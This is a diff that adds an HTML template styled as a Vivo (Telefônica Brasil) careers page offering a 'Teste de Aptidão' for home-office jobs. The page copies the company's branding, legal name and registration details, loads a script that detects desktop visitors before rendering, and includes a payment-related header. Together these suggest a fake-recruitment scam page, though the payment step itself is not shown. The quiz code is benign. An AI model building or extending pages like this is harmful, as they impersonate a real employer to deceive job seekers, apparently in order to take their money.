@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+{% include 'pagamento_head.html' %}
+    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
+    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
+    
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "r7dfa6ijq3");
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste de Aptidão - Vagas Home Office - Vivo</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Vivo Fonts -->
+    <style>
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeRegular.woff2') }}') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeBold.woff2') }}') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeLight.woff2') }}') format('woff2');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+    </style>
+    
+    <!-- Fallback Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" type="image/png">
+    
+    <style>
+        .answer-option {
+            display: block;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+        
+        .answer-option:hover {
+            background-color: #f8f8f8;
+        }
+        
+        .answer-option.selected {
+            border: 2px solid #660099;
+            background-color: #f9f5ff;
+        }
+        
+        .answer-option input {
+            position: absolute;
+            opacity: 0;
+        }
+        
+        .next-button {
+            background-color: #660099;
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            transition: all 0.2s ease;
+        }
+        
+        .next-button:hover {
+            background-color: #530080;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="vivo-header">
+        <div class="container">
+            <div class="row align-items-center py-3">
+                <div class="col-6">
+                    <a href="{{ url_for('index') }}">
+                        <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="vivo-logo">
+                    </a>
+                </div>
+                <div class="col-6 text-end">
+                    <a href="#" class="text-white mx-2"><i class="fas fa-user fs-4"></i></a>
+                    <a href="#" class="text-white position-relative mx-2">
+                        <i class="fas fa-bell fs-4"></i>
+                        <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
+                            1
+                        </span>
+                    </a>
+                    <a href="#" class="btn btn-link text-decoration-none d-none d-md-inline-block ms-3">Minha Vivo</a>
+                    <a href="#" class="btn btn-outline-light rounded-pill btn-sm d-none d-md-inline-block">Ajuda</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Breadcrumbs -->
+    <div class="container py-1" style="border-bottom: 1px solid #eee;">
+        <div>
+            <span style="font-size: 11px; color: #888;">TRABALHE CONOSCO &gt; HOME OFFICE &gt; TESTE DE APTIDÃO</span>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <main class="container my-4">
+        <div class="row">
+            <div class="col-lg-8 mx-auto">
+                <div class="card shadow-sm">
+                    <div class="card-header" style="background-color: #660099; color: white;">
+                        <h5 class="mb-0">Teste de Aptidão</h5>
+                    </div>
+                    <div class="card-body p-4">
+                        <div class="text-center mb-4">
+                            <h4 style="color: #660099; font-weight: 500;">Teste de Habilidades para Atendimento</h4>
+                            <p class="text-muted">Responda todas as perguntas para avaliarmos sua aptidão para a vaga</p>
+                        </div>
+                        
+                        <!-- Mudando para GET para evitar o erro H18 no servidor Heroku -->
+                        <form id="aptitudeTestForm" action="{{ url_for('resultado_teste') }}" method="get">
+                            <!-- Questões -->
+                            <div id="questionContainer">
+                                <!-- Questão 1 (visível inicialmente) -->
+                                <div class="question" data-question="1">
+                                    <h5 style="color: #333; margin-bottom: 20px;">1. Um cliente está reclamando que sua internet está lenta. Qual a primeira ação que você tomaria?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q1" value="a" required>
+                                            Solicitar que o cliente reinicie o roteador e aguardar
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q1" value="b">
+                                            Transferir imediatamente para o suporte técnico
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q1" value="c">
+                                            Perguntar sobre os sintomas específicos e há quanto tempo ocorre o problema
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q1" value="d">
+                                            Sugerir que o cliente contrate um plano de internet mais rápido
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 2 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="2">
+                                    <h5 style="color: #333; margin-bottom: 20px;">2. Um cliente está muito irritado e falando de forma agressiva. Qual a melhor abordagem?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q2" value="a" required>
+                                            Confrontar o cliente e pedir para que ele se acalme imediatamente
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q2" value="b">
+                                            Ouvir com atenção, mostrar empatia e se desculpar pela situação
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q2" value="c">
+                                            Transferir para outro atendente sem tentar resolver
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q2" value="d">
+                                            Encerrar o atendimento caso o cliente continue alterado
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 3 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="3">
+                                    <h5 style="color: #333; margin-bottom: 20px;">3. O cliente deseja cancelar o serviço da Vivo. Como você deve proceder?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q3" value="a" required>
+                                            Dificultar o processo de cancelamento para evitar a perda do cliente
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q3" value="b">
+                                            Cancelar imediatamente sem questionar os motivos
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q3" value="c">
+                                            Entender o motivo do cancelamento e oferecer soluções ou benefícios para retenção
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q3" value="d">
+                                            Transferir para outro setor sem tentar resolver
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 4 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="4">
+                                    <h5 style="color: #333; margin-bottom: 20px;">4. Qual o protocolo correto ao receber uma ligação de um cliente?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q4" value="a" required>
+                                            Perguntar diretamente o que o cliente deseja
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q4" value="b">
+                                            Identificar-se, cumprimentar o cliente e perguntar como pode ajudar
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q4" value="c">
+                                            Pedir imediatamente os dados cadastrais para verificação
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q4" value="d">
+                                            Transferir para o departamento específico sem atendimento inicial
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 5 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="5">
+                                    <h5 style="color: #333; margin-bottom: 20px;">5. Um cliente relata que sua fatura veio com um valor acima do contratado. O que fazer?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q5" value="a" required>
+                                            Informar que o valor está correto sem verificar o caso
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q5" value="b">
+                                            Verificar o histórico de faturas, confirmar os serviços contratados e identificar possíveis cobranças adicionais
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q5" value="c">
+                                            Transferir para o setor financeiro sem análise prévia
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q5" value="d">
+                                            Sugerir que o cliente pague e depois solicite reembolso
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 6 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="6">
+                                    <h5 style="color: #333; margin-bottom: 20px;">6. Qual é a forma mais adequada de explicar um termo técnico ao cliente?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q6" value="a" required>
+                                            Usar terminologia técnica completa para demonstrar conhecimento
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q6" value="b">
+                                            Simplificar a explicação usando termos do cotidiano e exemplos práticos
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q6" value="c">
+                                            Evitar explicar termos técnicos pois o cliente não entenderia
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q6" value="d">
+                                            Transferir para um técnico que possa explicar melhor
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 7 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="7">
+                                    <h5 style="color: #333; margin-bottom: 20px;">7. O cliente pergunta sobre um serviço que a Vivo não oferece. Como proceder?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q7" value="a" required>
+                                            Informar que a empresa não oferece aquele serviço e encerrar o atendimento
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q7" value="b">
+                                            Informar que a Vivo não oferece o serviço, mas apresentar alternativas que possam atender à necessidade do cliente
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q7" value="c">
+                                            Sugerir que o cliente procure outra operadora
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q7" value="d">
+                                            Vender um serviço similar mesmo que não atenda às necessidades do cliente
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 8 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="8">
+                                    <h5 style="color: #333; margin-bottom: 20px;">8. Qual é a melhor prática para finalizar um atendimento?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q8" value="a" required>
+                                            Encerrar a ligação assim que resolver o problema
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q8" value="b">
+                                            Perguntar se o cliente tem mais alguma dúvida, resumir o que foi feito e agradecer pelo contato
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q8" value="c">
+                                            Transferir para a pesquisa de satisfação sem avisar o cliente
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q8" value="d">
+                                            Pedir desculpas por qualquer inconveniente, mesmo que o atendimento tenha sido satisfatório
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 9 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="9">
+                                    <h5 style="color: #333; margin-bottom: 20px;">9. O cliente solicita um desconto que não está nas políticas da empresa. Como lidar com isso?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q9" value="a" required>
+                                            Conceder o desconto para não perder o cliente
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q9" value="b">
+                                            Explicar educadamente que o desconto solicitado não está disponível, mas verificar outras promoções ou benefícios que possam ser oferecidos
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q9" value="c">
+                                            Negar imediatamente sem oferecer alternativas
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q9" value="d">
+                                            Transferir para um supervisor sem tentar resolver
+                                        </label>
+                                    </div>
+                                </div>
+                                
+                                <!-- Questão 10 (inicialmente oculta) -->
+                                <div class="question d-none" data-question="10">
+                                    <h5 style="color: #333; margin-bottom: 20px;">10. Durante um pico de chamadas, como organizar o atendimento?</h5>
+                                    <div class="mt-3">
+                                        <label class="answer-option">
+                                            <input type="radio" name="q10" value="a" required>
+                                            Atender as chamadas rapidamente, mesmo que isso comprometa a qualidade
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q10" value="b">
+                                            Manter a qualidade e a atenção em cada atendimento, seguindo os protocolos, mesmo sob pressão
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q10" value="c">
+                                            Transferir os clientes para outros setores para reduzir a fila
+                                        </label>
+                                        <label class="answer-option">
+                                            <input type="radio" name="q10" value="d">
+                                            Pedir para os clientes ligarem em outro horário
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="navigation-buttons d-flex justify-content-end mt-4">
+                                <button type="button" id="nextQuestion" class="next-button">
+                                    PRÓXIMA <i class="fas fa-arrow-right ms-1"></i>
+                                </button>
+                                <a href="{{ url_for('resultado_teste') }}" id="finishTest" class="next-button d-none" style="text-decoration: none; color: white; display: inline-block; text-align: center;">
+                                    FINALIZAR TESTE <i class="fas fa-check ms-1"></i>
+                                </a>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-4 mt-5" style="background-color: #660099; color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Produtos e Serviços</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Planos Móveis</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Internet Fixa</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">TV</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Combo Vivo</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Vivo App</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Suporte</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Minha Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">2ª Via de Conta</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Cobertura</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Desbloqueio</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Institucional</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sobre a Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sustentabilidade</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Trabalhe Conosco</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Para Empresas</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5 class="mb-3">Redes Sociais</h5>
+                    <div class="d-flex mb-4">
+                        <a href="#" class="text-white me-3"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-youtube"></i></a>
+                        <a href="#" class="text-white"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                    <h5 class="mb-3">Baixe o App</h5>
+                    <div class="d-flex">
+                        <a href="#" class="text-white me-3"><i class="fab fa-app-store-ios"></i> App Store</a>
+                        <a href="#" class="text-white"><i class="fab fa-google-play"></i> Google Play</a>
+                    </div>
+                </div>
+            </div>
+            <hr class="my-4" style="border-color: rgba(255,255,255,0.2);">
+            <div class="row">
+                <div class="col-12 text-center text-white-50 small">
+                    <p class="mb-1">© 2025 Telefônica Brasil S.A. Todos os direitos reservados.</p>
+                    <p class="mb-0">CNPJ: 02.558.157/0001-62 | Endereço: Av. Eng. Luiz Carlos Berrini, 1376 - São Paulo - SP - 04571-936</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+                
+    <!-- Bootstrap, jQuery e Popper.js -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+    
+    <!-- Script para botões de opção de resposta -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Selecionar todos os contêineres de questões
+            const questions = document.querySelectorAll('.question');
+            const totalQuestions = questions.length;
+            let currentQuestionIndex = 0;
+            
+            const nextButton = document.getElementById('nextQuestion');
+            const finishButton = document.getElementById('finishTest');
+            
+            // Adicionar evento de clique em todas as opções de resposta
+            document.querySelectorAll('.answer-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remover a classe 'selected' de todas as opções do mesmo grupo
+                    const questionDiv = this.closest('.question');
+                    questionDiv.querySelectorAll('.answer-option').forEach(opt => {
+                        opt.classList.remove('selected');
+                    });
+                    
+                    // Adicionar a classe 'selected' à opção clicada
+                    this.classList.add('selected');
+                    
+                    // Marcar o input radio
+                    const radioInput = this.querySelector('input[type="radio"]');
+                    radioInput.checked = true;
+                });
+            });
+            
+            // Função para navegar para a próxima questão
+            function navigateToNextQuestion() {
+                // Verificar se a questão atual tem uma resposta selecionada
+                const currentQuestion = questions[currentQuestionIndex];
+                const selectedOption = currentQuestion.querySelector('input[type="radio"]:checked');
+                
+                if (!selectedOption) {
+                    alert('Por favor, selecione uma resposta antes de continuar.');
+                    return;
+                }
+                
+                // Ocultar a questão atual
+                currentQuestion.classList.add('d-none');
+                
+                // Avançar para a próxima questão
+                currentQuestionIndex++;
+                
+                // Verificar se chegamos à última questão
+                if (currentQuestionIndex === totalQuestions - 1) {
+                    // Estamos na última questão, então escondemos o botão Próxima e mostramos o Finalizar
+                    nextButton.classList.add('d-none');
+                    finishButton.classList.remove('d-none');
+                }
+                
+                // Mostrar a próxima questão
+                if (currentQuestionIndex < totalQuestions) {
+                    questions[currentQuestionIndex].classList.remove('d-none');
+                }
+            }
+            
+            // Adicionar evento de clique ao botão Próxima
+            nextButton.addEventListener('click', navigateToNextQuestion);
+
+            // Modificar o comportamento do botão Finalizar
+            finishButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                const form = document.getElementById('aptitudeTestForm');
+                const formData = new FormData(form);
+                const searchParams = new URLSearchParams(window.location.search);
+                
+                // Adicionar os parâmetros do formulário aos parâmetros da URL
+                for (let [key, value] of formData.entries()) {
+                    searchParams.append(key, value);
+                }
+                
+                // Redirecionar para a página de resultado com os parâmetros preservados
+                window.location.href = form.action + '?' + searchParams.toString();
+            });
+        });
+    </script>
+</body>
+</html>
